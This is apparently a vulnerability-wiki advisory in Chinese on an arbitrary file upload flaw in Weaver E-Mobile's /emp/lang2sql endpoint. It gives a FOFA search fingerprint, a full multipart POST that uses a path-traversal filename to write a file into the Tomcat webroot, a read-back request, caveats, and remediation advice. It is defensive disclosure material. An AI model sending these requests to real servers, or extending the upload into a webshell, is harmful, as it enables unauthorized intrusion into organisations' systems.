---
cve: ""
fofa: "app=\"泛微-EMobile\""
version: "未知"
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/%E6%B3%9B%E5%BE%AE%20e-Mobile-lang2sql%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.yaml"
---

# 泛微E-Mobile lang2sql 任意文件上传漏洞

## 漏洞描述

泛微 E-Mobile 的语言处理接口 `/emp/lang2sql` 接收上传文件。公开 PoC 在上传文件名中使用相对路径，将文本写入 Tomcat Web 根目录后回读，用于验证文件保存路径限制失效。

## 影响范围与前提

产品：泛微 E-Mobile；具体受影响版本与补丁范围未知。公开路径假设服务器使用所示 `appsvr/tomcat/webapps/ROOT` 目录布局且具有写入权限；不能据此外推到所有部署。

## 公开验证资料

请求及文本标记取自上游，包含不可省略的查询参数与 `file` 文件字段：

```http
POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
Host: oa.example.com
Content-Type: multipart/form-data; boundary=VulWikiBoundary

--VulWikiBoundary
Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/tmslpwlw.txt"

uweesjfp
--VulWikiBoundary--
```

回读：

```http
GET /tmslpwlw.txt HTTP/1.1
Host: oa.example.com
```

这组请求会写入文件。隔离验证需先排除同名旧文件，再确认返回本次文本 `uweesjfp` 并清理产物。文本成功回读只证明对应位置的文件写入与访问，不能自动证明 JSP 解析或服务器控制权限。

## 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

## 参考来源

- [公开资料 1](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/%E6%B3%9B%E5%BE%AE%20e-Mobile-lang2sql%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
